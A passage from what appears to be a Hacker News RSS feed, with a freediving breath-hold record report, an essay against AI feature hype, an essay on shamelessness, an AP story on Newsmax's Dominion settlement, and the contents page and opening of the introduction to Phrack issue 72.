<p>His near-half-hour feat took place on 14 June in a 3m-deep pool at the Bristol Hotel in Opatija, Croatia in front of five official judges and some 100 spectators.</p>



<figure><img fetchpriority="high" decoding="async" width="1024" height="683" src="https://divernet.com/wp-content/uploads/2025/06/Vitomir-2-1024x683.jpg" data-orig-src="https://divernet.com/wp-content/uploads/2025/06/Vitomir-2-1024x683.jpg" alt="Croatian freediver Vitomir Maričić" title="How Croatian freediver held breath for 29 minutes 1" srcset="https://divernet.com/wp-content/uploads/2025/06/Vitomir-2-300x200.jpg 300w, https://divernet.com/wp-content/uploads/2025/06/Vitomir-2-768x512.jpg 768w, https://divernet.com/wp-content/uploads/2025/06/Vitomir-2-1024x683.jpg 1024w, https://divernet.com/wp-content/uploads/2025/06/Vitomir-2-1320x880.jpg 1320w, https://divernet.com/wp-content/uploads/2025/06/Vitomir-2-1536x1024.jpg 1536w, https://divernet.com/wp-content/uploads/2025/06/Vitomir-2.jpg 1920w" data-srcset="https://divernet.com/wp-content/uploads/2025/06/Vitomir-2-300x200.jpg 300w, https://divernet.com/wp-content/uploads/2025/06/Vitomir-2-768x512.jpg 768w, https://divernet.com/wp-content/uploads/2025/06/Vitomir-2-1024x683.jpg 1024w, https://divernet.com/wp-content/uploads/2025/06/Vitomir-2-1320x880.jpg 1320w, https://divernet.com/wp-content/uploads/2025/06/Vitomir-2-1536x1024.jpg 1536w, https://divernet.com/wp-content/uploads/2025/06/Vitomir-2.jpg 1920w" data-sizes="auto" data-orig-sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Freediver Vitomir Maričić </figcaption></figure>



<p>Maričić prepared by pre-breathing pure oxygen for an unspecified length of time before his immersion, in line with <a href="https://www.guinnessworldrecords.com/" target="_blank" rel="nofollow noopener">GWR</a> guidelines. In past attempts, up to 30 minutes has been allowed for this preparatory phase. He then lay on his back at the bottom of the pool, hands behind his head.</p>



<p>Also read: <strong><a href="https://divernet.com/scuba-news/freediving/59yr-old-claims-mens-breath-hold-walk-record/">59yr-old claims men’s breath-hold walk record</a></strong></p>



<p>“After the 20-minute mark, everything became easier, at least mentally,” he said after surfacing, but explained that the experience had “got worse and worse physically, especially for my diaphragm, because of the contractions. But mentally I knew I wasn’t going to give up.” He credited his achievement to the support of his team, family and friends.</p>



<h2 id="record-history">Record history</h2>



<p>The record had previously been held by fellow-Croatian Budimir Šobat who, in 2021 at the age of 56, held his breath for 24min, 37sec, breaking the existing record by 34sec.</p>



<p>Back in 2008, magician and endurance artist David Blaine had set the GWR record at 17min 4sec during a live broadcast on <em>The Oprah Winfrey Show</em>.&nbsp;</p>



<p>For comparison, the official AIDA world record for static apnea (underwater breath-hold on air) is 11min 35sec, set by Frenchman Stéphane Mifsud in 2013. The GWR static apnea record, which has its own verification protocols, was set by Serbian Branko Petrović at 11min 54sec the following year. </p>



<p>Maričić’s AIDA static apnea best is 10min 8sec. He also set the Guinness World Record for <a href="https://divernet.com/scuba-news/freediver-goes-for-an-epic-walk/" data-type="link" data-id="https://divernet.com/scuba-news/freediver-goes-for-an-epic-walk/">longest underwater walk</a> on one breath at 107m in 2021.</p>



<p>Oxygen pre-breathing is understood to be a technique used by actors on some underwater film-shoots to allow them to stay immersed for longer. Denitrogenation, the process of replacing the nitrogen in the lungs with oxygen, can increase the amount of usable oxygen from some 450ml to almost 3 litres. </p>



<p>Reducing carbon dioxide build-up delays the urge to breathe and extends the “safe apnea time” before oxygen levels drop to dangerous levels. </p>



<p>Highly controlled diaphragmatic breathing is required in the breathe-up, and the body has to be deeply relaxed to keep the heart-rate low, requiring exceptional body awareness, breathing technique and mental control.</p>



<p><strong>Also on Divernet: <a href="https://divernet.com/scuba-news/freediver-goes-for-an-epic-walk/">Freediver goes for an epic walk</a>, <a href="https://divernet.com/scuba-news/freediving/freediver-klovar-breaks-trubridges-17-year-no-fins-reign/">Freediver Klovar breaks Trubridge’s 17-year no-fins reign</a>, <a href="https://divernet.com/scuba-news/kate-winslet-breath-holding-for-britain/">Kate Winslet: breath-holding for Britain?</a>, <a href="https://divernet.com/scuba-news/freediving/ex-scuba-instructor-died-in-pool-breath-hold/">Ex scuba instructor died in pool breath-hold</a></strong></p>
				</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[What could have been (143 pts)]]></title>
            <link>https://coppolaemilio.com/entries/what-could-have-been/</link>
            <guid>44945966</guid>
            <pubDate>Mon, 18 Aug 2025 22:29:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://coppolaemilio.com/entries/what-could-have-been/">https://coppolaemilio.com/entries/what-could-have-been/</a>, See on <a href="https://news.ycombinator.com/item?id=44945966">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		<p>No matter what your opinion on AI is, you probably have one already. Positive or negative, AI discourse is hard to avoid. 
The most dedicated AI evangelists will tell you that: <em>“AGI is around the corner. Your job? obsolete. You don’t think so? Well, see how much things improved from last year? imagine how it will be like in 5 years!”</em> You’ve read everything that could be said about it already at least 10 times.</p>

<p>I’ve seen people trying to debunk all those claims but there’s something that I rarely see.</p>

<p>What could have been if instead of spending so much energy and resources on developing “AI features” we focused on making our existing technology better?</p>

<p>AI gets added into every software possible nowadays. Features almost no one wants, and no one needs, that only make the existing software worse. I’m sure you know what I mean, we have all been victims of it in some way or another.</p>

<p>(I would insert here one of those funny screenshots of Google telling you to eat rocks but you’ve seen it already)</p>

<p>It pains me to think about all the money being funneled into the AI bubble. Money that could have funded so many real solutions to real problems. There is a lot of software to be made, improved, and released, but the tech industry refuses to see this.</p>

<p>Tech executives are robbing every investor blind. Promising the biggest breakthrough in technology while our current technology rots to the core. The operative systems we run, the browsers we use, our critical infrastructure gets consistently neglected to chase a promised wonderland of automation that never arrives.</p>

<p>There isn’t a single day where I don’t have to deal with software that’s broken but no one cares to fix. And I know what AI enthusiast will say: don’t worry, AI will fix them for us!</p>

<p>On Bluesky I saw <a href="https://bsky.app/profile/rystorm.com/post/3lwoqjqu6t22u">this post by Robin-Yann Storm</a>:</p>

<blockquote>
  <p>Gamescom’s app added an AI feature this year and it did not go well. Folks were overwhelmed with automatically generated meeting requests that they did not want. It generated a lot of stuff, but not value.</p>
</blockquote>

<p>The post contains an image of an email from Gamescom that reads:</p>

<blockquote>
  <p>Hello Robin-Yann,
We tested a new feature today - the Al meeting generator. The aim was to suggest suitable business contacts based on your profiles and make it easier for you to plan your trade fair contacts.
However, your honest feedback shows us that this feature does not provide the desired added value. We have therefore decided to completely remove the automatically generated meetings from your profiles.
Thank you for your openness. Your feedback is a central component of our further development - together we will make the platform better.
We apologize for any inconvenience caused.
Your gamescom team</p>
</blockquote>

<p>I’ve been to many conferences since <a href="https://coppolaemilio.com/entries/my-first-gdc/">I started working at the Godot Foundation</a>, and they all have one thing in common: horribly broken meeting/networking apps. If you’ve been to a conference you probably already suffered them. The direct messages work half of the time leaving messages undelivered. Registered people missing when you search for them, but still visible if you open a direct link to their profile. Scheduling features that fail to process any kind of rescheduling. The list goes on.</p>

<p>People end up ditching them to network via other apps: linkedin, twitter, email, bluesky. But I still believe that the idea of a networking app for a conference is still good and should be pursued. So I ask: Why is adding AI the priority here? What could have been if the investment went into making these apps better?</p>

<p>I’m not naive. What motivates people to include AI everywhere is the promise of profit. What motivates most AI startups or initiatives is just that. A promise.</p>

<p>But, don’t you think that by making a good product you will achieve that profit? Your product doesn’t need AI to get more users, more money, more features. It just needs to be better.</p>

<p>Unfortunately, people making decisions (if there are any) only chase ghosts and short term profits. They don’t think that they are crippling their companies and dooming their long term profitability. The enshittification is a disease that will keep spreading trying to suck every ounce of life from every product until they are too weak to continue.</p>

<p>I could now finish the post by breaking down budgets of organizations such as Blender, Godot, or Ladybird and comparing them with those that the tech gigants are spending on chasing their AI dreams while delivering absolutely nothing of value. But it would be too depressing. Last time I did this, with just one company’s budget you could fund more than 100 years of real open-source software development. Solving real needs we have now. Improving software we use every day. Making critical infrastructure that our life depends on.</p>

<p>Even if we manage to snap out of the AI bubble, we are never going to get these years back. I can only be left to wonder what could have been.</p>

	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Lab-grown salmon hits the menu (162 pts)]]></title>
            <link>https://www.smithsonianmag.com/smart-news/lab-grown-salmon-hits-the-menu-at-an-oregon-restaurant-as-the-fda-greenlights-the-cell-cultured-product-180986769/</link>
            <guid>44945959</guid>
            <pubDate>Mon, 18 Aug 2025 22:29:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.smithsonianmag.com/smart-news/lab-grown-salmon-hits-the-menu-at-an-oregon-restaurant-as-the-fda-greenlights-the-cell-cultured-product-180986769/">https://www.smithsonianmag.com/smart-news/lab-grown-salmon-hits-the-menu-at-an-oregon-restaurant-as-the-fda-greenlights-the-cell-cultured-product-180986769/</a>, See on <a href="https://news.ycombinator.com/item?id=44945959">Hacker News</a></p>
Couldn't get https://www.smithsonianmag.com/smart-news/lab-grown-salmon-hits-the-menu-at-an-oregon-restaurant-as-the-fda-greenlights-the-cell-cultured-product-180986769/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Shamelessness as a strategy (2019) (212 pts)]]></title>
            <link>https://nadia.xyz/shameless</link>
            <guid>44945943</guid>
            <pubDate>Mon, 18 Aug 2025 22:27:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nadia.xyz/shameless">https://nadia.xyz/shameless</a>, See on <a href="https://news.ycombinator.com/item?id=44945943">Hacker News</a></p>
<div id="readability-page-1" class="page"><div ?="">
        <p>I’ve enjoyed playing a game called Avalon recently. I won’t go too far into the rules, but it’s a <a href="https://www.bestplay.co/ultimate-guide-hidden-role-board-games/">hidden role game</a> in the vein of Secret Hitler or Werewolf, where one team is “good”, trying to uncover who among them is “evil”, before the evil team wins.</p>

<p>One of the characters you can play is Merlin. Merlin knows who the evil players are, but can’t reveal what he knows, because the evil team can kill Merlin and win the game. So Merlin relies on another character, Percival, to be his decoy.</p>

<p>Percival’s only power is that he knows who Merlin is. So he secretly watches Merlin’s actions throughout the game and amplifies those signals to the rest of the group. The typical strategy is for Percival to attract attention away from Merlin and towards himself.</p>

<p>But another, riskier strategy is for <em>Merlin</em> to play as though <em>he</em> is Percival. In this case, Merlin displays what he knows so shamelessly that he throws everyone off. The evil team, believing that no Merlin would be stupid enough to put himself out there like that, figures he must be Percival, and writes him off.</p>

<p>The Merlin-as-Percival strategy is bold, because it blatantly defies our expectations about how the game is won. To pull it off, Merlin must create confusion around his actions. He needs the other players to feel unsure about whether he’s being incredibly stupid or incredibly smart.</p>

<p>Increasingly, I think the “shameless” approach is becoming a dominant strategy today. It was first popularized in modern canon by Paris Hilton, who played the “dumb blonde heiress” stereotype so smoothly that everyone assumed she really was as stupid as she seemed.</p>

<p>Paris didn’t play by the “obvious” rules for famous people. She was widely derided by both media and her peers as at best, a train wreck, and at worst, a self-serving aggrandizer. And yet, people couldn’t stop talking about her. A decade later, Paris is now remembered as the mastermind behind the playbook that’s made the Kardashians, Jenners, and other celebrity socialites so successful.</p>

<p>It’s important to note that people were dismissive of Paris because validating her playbook would mean admitting that <em>they</em> were playing an inferior game. Everyone else had invested years into optimizing for the most legible version of the rules. They’d look silly if they were to admit she had found a better way of doing things.</p>

<p>Without getting into tiresome politics, the “shameless” strategy also defined the 2016 U.S. presidential elections. It was shouted down by people in both established political parties, because they were used to playing by the “obvious” rules, but I suspect that in a decade’s time, we’ll look back on that election and realize that it marked the beginning of an entirely new style of politics.</p>

<p>Ditto to, perhaps, the leadership styles of Mark Zuckerberg, who’s followed the “obvious” playbook for years, versus Jack Dorsey, who employs tactics that seem so obviously stupid (tweeting about fasting and meditation!) that we’re quick to write them off. And yet, I’d guess that Zuckerberg’s strategy makes him increasingly unlikeable and untrustworthy, in the same way that any major politician sticking to a pre-2016 playbook today is almost certainly not going to win.</p>

<p>The shameless strategy feels counterintuitive, because our first instinct is to want to punish that sort of behavior. And historically, those sanctions have been effective. Punishing outlandish behavior is an important aspect of cooperative governance: it preserves social order by ensuring that we all play by the same rules.</p>

<p>Today, it seems like punishing shamelessness only <em>increases</em> social rewards to the transgressor. What’s changed?</p>

<p>One explanation might be that it’s an expected effect of the blurring of social boundaries today. In the past, if the size of your community was finitely bounded (like a village, or an aristocratic social class), people didn’t enter or exit these communities as frequently. Under these conditions, sanctions are probably still effective, because members of the community want to be liked and accepted.</p>

<p>But the borders to online communities are much more fluid - perhaps even nonexistent. Under open borders, sanctions will backfire, because they just serve as a signaling boost for the transgressor, attracting outsiders who resonate with that person’s message. What’s meant to be punishment instead becomes a flare shot straight into the night sky.</p>

<p>The “establishment” mistakenly assumes that a shameless person wants the approval of their community, when it turns out that, much like any cult or counterculture, that person’s goal was to attract a following, regardless of who the members are. The disgust of one’s peers doesn’t matter anymore, because that disgust forms the basis for an entirely new community.</p>

<p>A common critique of shameless people is questioning their intelligence. But one of the most bizarre aspects here is it doesn’t actually matter how aware that person is of what they’re doing. The concept of a “genius mastermind” is itself outdated, because it assumes that someone needs to be in control. The shameless person is simply a host for a set of ideas, which, like any virus, will continue to propagate as long as there are willing hosts to receive it.</p>

<p>I’m not really sure what the long-term implications of shamelessness will be. I also don’t think that everybody has to employ this strategy to win (at least, I hope not!). But what I do know is when I see my peers rolling their eyes at someone or deriding them for being “shameless”, there’s a good chance that, instead of writing them off, we should examine their actions a bit more closely.</p>

    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Newsmax agrees to pay $67M in defamation case over bogus 2020 election claims (190 pts)]]></title>
            <link>https://apnews.com/article/dominion-voting-newsmax-defamation-trump-2020-3b2366dfdae3a8432afe822bf14fe1ef</link>
            <guid>44945925</guid>
            <pubDate>Mon, 18 Aug 2025 22:23:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://apnews.com/article/dominion-voting-newsmax-defamation-trump-2020-3b2366dfdae3a8432afe822bf14fe1ef">https://apnews.com/article/dominion-voting-newsmax-defamation-trump-2020-3b2366dfdae3a8432afe822bf14fe1ef</a>, See on <a href="https://news.ycombinator.com/item?id=44945925">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                                        <p>DENVER (AP) — The conservative network Newsmax will pay $67 million to settle a lawsuit accusing it of defaming a voting equipment company by spreading lies about President <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/hub/donald-trump">Donald Trump’s</a></span> 2020 election loss, according to documents filed Monday.</p><p>The settlement comes after Fox News Channel <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/fox-news-dominion-lawsuit-trial-trump-2020-0ac71f75acfacc52ea80b3e747fb0afe">paid $787.5 million</a></span> to settle a similar lawsuit in 2023 and Newsmax paid what court papers describe as $40 million to <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/smartmatic-newsmax-lawsuit-2020-election-96d35dc10009b68cbb548ef7bea10284">settle a libel lawsuit</a></span> from a different voting machine manufacturer, Smartmatic, which also was <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/election-2020-joe-biden-donald-trump-technology-electronic-voting-cd68ad2022611a36154ff3f243fcd1d8">a target</a></span> of pro-Trump conspiracy theories on the network.</p><p>Delaware Superior Court Judge Eric Davis had ruled earlier that Newsmax did indeed defame Denver-based Dominion Voting Systems by airing false information about the company and its equipment. But Davis left it to a jury to eventually decide whether that was done with malice, and, if so, how much Dominion deserved from Newsmax in damages. Newsmax and Dominion reached the settlement before the trial could take place.</p>
    
<p>The settlement was disclosed by Newsmax in a new filing with the U.S. Securities and Exchange Commission. It said the deal was reached Friday. </p>



<p>“Newsmax believed it was critically important for the American people to hear both sides of the election disputes that arose in 2020,” the company said in a statement. “We stand by our coverage as fair, balanced, and conducted within professional standards of journalism.”</p>
    
    
    
<p>A spokesperson for Dominion said the company was pleased to have settled the lawsuit.</p><p>The disclosure of the settlement came as Trump, who <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/joe-biden-wins-white-house-ap-fd58df73aa677acb74fce2a69adb71f9">lost his 2020 reelection bid</a></span> to Democrat Joe Biden, vowed in a social media post Monday to eliminate mail-in ballots and voting machines such as those supplied by Dominion and other companies. It was unclear how the Republican president could achieve that.</p><p>The same judge also handled the Dominion-Fox News case and made a similar ruling that the network repeated <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/fox-news-dominion-lawsuit-trial-explainer-trump-fbd401a951905879d837a8860b3bec5e">numerous lies</a></span> by Trump’s allies about his 2020 loss despite <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/united-states-government-news-media-donald-trump-fraud-b52914ec21a97dec8b5d878a908d566f">internal communications</a></span> showing Fox officials knew the claims <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/politics-fraud-donald-trump-24d6322f99281fdfb46c272e3ac6bacf">were bogus</a></span>. At the time, Davis found it was “CRYSTAL clear” that none of the allegations was true.</p>
    
<p>Internal correspondence from Newsmax officials likewise shows they knew the claims were baseless.</p><p>“How long are we going to play along with election fraud?” Newsmax host Bob Sellers said two days after the 2020 election was <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/election-claims-biden-won-explained-bd53b14ce871412b462cb3fe2c563f18">called for Biden</a></span>, according to internal documents revealed as part of the case. </p><p>Newsmax took pride that it was not calling the election for Biden and, the internal documents show, saw a business opportunity in catering to viewers who believed Trump won. Private communications that surfaced as part of Dominion’s earlier defamation case against Fox News <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/politics-television-donald-trump-business-1a4337a89c8abd952a814c60fa269b3c">also revealed</a></span> how the network’s business interests intersected with decisions it made related to coverage of <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/capitol-riot-trump-election-lies-explainer-816a43ed964e6d35f03b0930e6e56c82">Trump’s 2020 election claims</a></span>.</p><p>At Newsmax, employees repeatedly warned against false allegations from pro-Trump guests such as attorney <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/donald-trump-joe-biden-michigan-detroit-election-2020-4fd2ba9b84e9d9a6bcddd51872ba3f97">Sidney Powell</a></span>, according to documents in the lawsuit. In one text, even Newsmax owner Chris Ruddy, a Trump ally, said he found it “scary” that Trump was meeting with Powell.</p>
    
<p>Dominion was at the heart of many of the wild claims aired by guests on Newsmax and elsewhere, who promoted a conspiracy theory involving deceased Venezuelan president Hugo Chavez to rig the machines for Biden. The network <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/fox-newsmax-smartmatic-dominion-lawsuits-826071eb5b52ec8aea6b0028da78c61c">retracted some of the more bombastic allegations</a></span> in December 2020.</p><p>Though Trump has insisted <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/trump-2020-election-lies-debunked-4fc26546b07962fdbf9d66e739fbb50d">his fraud claims</a></span> are real, there’s no evidence they were, and the lawsuits in the Fox and Newsmax cases show how some of the president’s biggest supporters knew they were false at the time. Trump’s then-attorney general, William Barr, said there was <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/barr-no-widespread-election-fraud-b1f1488796c9a98c4b1a9061a6c7f49d">no evidence</a></span> of widespread fraud.</p><p>Trump and his backers lost <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/donald-trump-losing-election-lawsuits-36d113484ac0946fa5f0614deb7de15e">dozens of lawsuits</a></span> alleging fraud, some before Trump-appointed judges. Numerous <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/election-2020-joe-biden-donald-trump-georgia-elections-4eeea3b24f10de886bcdeab6c26b680a">recounts</a></span>, <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/elections-government-and-politics-nevada-ed4d5296d9fd7fd9afd83a3fe845c205">reviews</a></span> and <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/joe-biden-wisconsin-presidential-elections-state-elections-madison-9a2f172dd8074668ded26bd5b0b41fbb">audits</a></span> of the election results, including <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/donald-trump-joe-biden-election-2020-elections-government-and-politics-4b6643aa699480dc63cbce8555aac946">some run by Republicans</a></span>, turned up no signs of significant wrongdoing or error and affirmed Biden’s win.</p><p>After returning to office, Trump <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/capitol-jan-6-pardons-trump-justice-department-8ce8b2a8f8cb602d5eaf85ac7b969606">pardoned</a></span> those who tried to halt the transfer of power during the <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/congress-confirm-joe-biden-78104aea082995bbd7412a6e6cd13818">Jan. 6, 2021, attack</a></span> on the U.S. Capitol and <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/trump-retaliation-miles-taylor-chris-krebs-efb1416926df9d1086fa21349a18f90b">directed</a></span> his Department of Justice to investigate Chris Krebs, a former Trump cybersecurity appointee who had <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/top-officials-elections-most-secure-66f9361084ccbc461e3bbf42861057a5">vouched for the security and accuracy</a></span> of the 2020 election.</p>
    
<p>As an initial trial date approached in the Dominion case earlier this year, Trump issued an <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://www.whitehouse.gov/presidential-actions/2025/04/addressing-risks-from-susman-godfrey/" target="_blank" rel="noopener">executive order</a></span> attacking the law firm that litigated it and the Fox case, Susman Godfrey. The order, part of a series <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/trump-perkins-coie-law-firm-executive-order-206052ec8157380fb2e23010a6f88815">targeting law firms</a></span> Trump has tussled with, cited Susman Godfrey’s work on elections and said the government would not do business with any of its clients or permit any of its staff in federal buildings.</p><p>A federal judge put that action on hold, saying the framers would view it as <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/trump-law-firm-susman-godfrey-eada6cc436533ea3b483568c8287600e">“a shocking abuse of power.</a></span> ”</p>
                                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Phrack 72 (156 pts)]]></title>
            <link>https://phrack.org/issues/72/1</link>
            <guid>44945660</guid>
            <pubDate>Mon, 18 Aug 2025 21:43:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://phrack.org/issues/72/1">https://phrack.org/issues/72/1</a>, See on <a href="https://news.ycombinator.com/item?id=44945660">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<table>
   <tbody>
      <tr><td><a href="https://phrack.org/issues/72/1_md.html#article">Introduction</a></td><td>Phrack Staff</td></tr>

<tr><td><a href="https://phrack.org/issues/72/2.html#article">Phrack Prophile on Gera</a></td><td>Phrack Staff</td></tr>

<tr><td><a href="https://phrack.org/issues/72/3_md.html#article">Linenoise</a></td><td>Phrack Staff</td></tr>

<tr><td><a href="https://phrack.org/issues/72/4_md.html#article">Loopback</a></td><td>Phrack Staff</td></tr>

<tr><td><a href="https://phrack.org/issues/72/5_md.html#article">The Art of PHP - My CTF Journey and Untold Stories!</a></td><td>Orange Tsai</td></tr>

<tr><td><a href="https://phrack.org/issues/72/6_md.html#article">Guarding the PHP Temple</a></td><td>mr_me</td></tr>

<tr><td><a href="https://phrack.org/issues/72/7_md.html#article">APT Down - The North Korea Files</a></td><td>Saber, cyb0rg</td></tr>

<tr><td><a href="https://phrack.org/issues/72/8_md.html#article">A learning approach on exploiting CVE-2020-9273</a></td><td>dukpt</td></tr>

<tr><td><a href="https://phrack.org/issues/72/9_md.html#article">Mapping IOKit Methods Exposed to User Space on macOS</a></td><td>Karol Mazurek</td></tr>

<tr><td><a href="https://phrack.org/issues/72/10_md.html#article">Popping an alert from a sandboxed WebAssembly module</a></td><td>th0mas.nl</td></tr>

<tr><td><a href="https://phrack.org/issues/72/11_md.html#article">Desync the Planet - Rsync RCE</a></td><td>Simon, Pedro, Jasiel</td></tr>

<tr><td><a href="https://phrack.org/issues/72/12_md.html#article">Quantom ROP</a></td><td>Yoav Shifman, Yahav Rahom</td></tr>

<tr><td><a href="https://phrack.org/issues/72/13_md.html#article">Revisiting Similarities of Android Apps</a></td><td>Jakob Bleier, Martina Lindorfer</td></tr>

<tr><td><a href="https://phrack.org/issues/72/14_md.html#article">Money for Nothing, Chips for Free</a></td><td>Peter Honeyman</td></tr>

<tr><td><a href="https://phrack.org/issues/72/15_md.html#article">E0 - Selective Symbolic Instrumentation</a></td><td>Jex Amro</td></tr>

<tr><td><a href="https://phrack.org/issues/72/16_md.html#article">Roadside to Everyone</a></td><td>Jon Gaines</td></tr>

<tr><td><a href="https://phrack.org/issues/72/17_md.html#article">A CPU Backdoor</a></td><td>uty</td></tr>

<tr><td><a href="https://phrack.org/issues/72/18_md.html#article">The Feed Is Ours</a></td><td>tgr</td></tr>

<tr><td><a href="https://phrack.org/issues/72/19.html#article">The Hacker's Renaissance - A Manifesto Reborn</a></td><td>TMZ</td></tr>

   </tbody>
</table>

<p><strong>Title</strong> : Introduction</p>
<p><strong>Author</strong> : Phrack Staff</p>
<pre>                              ==Phrack Inc.==

                Volume 0x10, Issue 0x48, Phile #0x01 of 0x12

|=-----------------------------------------------------------------------=|
|=-------------------------=[ Introduction ]=----------------------------=|
|=-----------------------------------------------------------------------=|
|=----------------------=[    Phrack Staff    ]=-------------------------=|
|=-----------------------=[ <a href="https://phrack.org/cdn-cgi/l/email-protection" data-cfemail="d9aaadb8bfbf99a9b1abb8bab2f7b6abbe">[email&nbsp;protected]</a> ]=--------------------------=|
|=-----------------------------------------------------------------------=|
|=----------------------=[  August  19, 2025  ]=-------------------------=|
|=-----------------------------------------------------------------------=|

    _______ ____ ____    _______     _______________  _____   _____
 ._\\____  \\   |    |__\\__    \  _\\__   /\    __//_\    | /    /
 :    |/   &gt;&gt;   :    :    :/    /./    /    |    |   /.    !/    /
 |    :    /         |    /     \|    __    |    |    |    /     \
 |    ____/|    |    |    \      \     |    |__  :    |    \      \
 |    |/// |____|    |_____\     |\___ |    ://\      !_____\      \
 |    :    /////:____|/////\\____|////\\___/.   \\____://///\\_____/
 |___/ e-zine   /////:     //////|     ////      /////       //////
 ////                .           :                x0^67^aMi5H^iMP!


--[ Hacker Evolution 


For 40 years, Phrack has published papers that have reflected and shaped 
hacker culture. The knowledge shared in Phrack has laid the foundation for
many fields of study, providing insight, a shared language, resources 
and tools, as well as context and history. Phrack is written by hackers, 
for hackers, and offers a glimpse into the world just beyond what most 
people see.


Phrack is both a technical journal and a cultural document. Like all zines, 
it represents a snapshot of the scene at the time. We share not just our 
discoveries, but the stories of how we came to know things and the context 
in which we existed. We share our triumphs, failures, and lessons learned. 
By fostering a culture of communal idea sharing, we learn how to solve 
problems creatively, and make the most of our current situation. 


Over the past 40 years, hacking has evolved, splintered, and mutated into 
a variety of forms. Phrack has documented many of the key innovations in 
hacking since its first issue: From showcasing ways to manipulate the phone 
system and other large computers, to pioneering vulnerability scanning, to 
generalizing security concepts such as buffer overflows, ROP, and heap 
exploitation, to bringing it all together within complex ecosystems that 
seemed like just a fantasy in years past. Each generation builds off the 
previous and offers us new perspectives, remixing with older ideas and 
demonstrating how they can be reapplied to new situations. When Phrack was 
first published in the mid-80s, our relationship with technology was quite 
different. Many of our challenges involved simply getting and staying 
online. Today we face entirely new challenges based on what is, what was, 
and what will be.


The hacker ethos remains the same - be curious about your world, make do 
with what you have, and show how things can be better.


What was done before us, and the knowledge shared, provides the base for 
us to build off of and evolve from. As hackers, we pass on our best 
characteristics by teaching others. We document how and why we did things
based on what was available at the time. We expand on previous generations'
work and piece together our own understanding, informed by our own personal 
experience. The reward is the beauty of what we discover and create, and
the joy of sharing and inspiring others. Over time, all of our most beloved 
and reliable techniques and tools become common knowledge, and new 
permutations pop up. As circumstances change, so do our needs. What's old
becomes new again, new ideas recontextualize the old. The cycle continues.


Knowledge is the hacker DNA. Our instincts and curiosity are complimented 
by the stories of how things were accomplished before. Like hackers and 
humans before us, we adapt to our environment, and figure out how to meet
our needs and achieve our goals. As technology becomes more optimized and 
abstracted, it can be easy to lose track of the fundamentals. Just because 
tech has evolved doesn't mean the foundation has changed. We still use AT 
commands to control our modems. We still activate the A20 line to access
memory beyond 1MB on x86 CPUs. In-band signaling is still a pathway into 
the toughest systems. Weird machines still manifest throughout it all, 
waiting to be discovered by a hacker like you.


Everything is in a state of flux, and the only constant is change. Yet, if 
we position ourselves correctly, our actions can influence the future. 
Things mutate. There are happy accidents. The world is chaos, and out of 
chaos emerges hackers.


Hacking has no choice but to evolve, and hacker zines like Phrack evolve
with it. We look back at our foundation for inspiration, while we also look
forward towards uncharted territory, unafraid of going beyond. We venture 
into the deepest darkest rabbit holes that few dare to tread, where we see 
the light that leads us to the most amazing treasures. We address the needs 
of our communities, find ways to grow together, and encourage each other
to keep exploring. We maintain projects like Phrack because it gives a 
platform for the unadulterated voice of the hacker. 


Humans are hackers. We were put here to figure things out. Hacking is an
innate skill to be tapped into and developed. The hacker spirit guides us 
through situations once thought hopeless. Hacking is a way to answer your 
own burning questions, a way to discover your own potential, and a way to 
create a world you want to live in.


There is a hacker born every day. It's our duty to share things that can
inform them of the past and present, and give them hope for a better 
tomorrow. After all, we're all alike.


--[ Welcome to Phrack #72 

This edition is not just a milestone but a testament to the relentless
curiosity, stubborn brilliance, and uncompromising spirit of a global 
community that refuses to be silenced. A tribute to the old school and 
the new blood. To the legends who paved the way, and to those just 
starting to carve their path. It’s held together with tape, sweat, late 
nights, fried brains, and that twitchy love for the broken and beautiful 
mess of systems.

Huge thanks to every author who contributed their knowledge, tools, 
exploits, vision, and war stories. Your work keeps the scene alive 
and sharp.

To the reviewers and editors who read between the lines and asked the 
hard questions. You pushed for clarity without dulling the edge.

To the artists who dropped visuals, raw pixel filth, and clean design. 
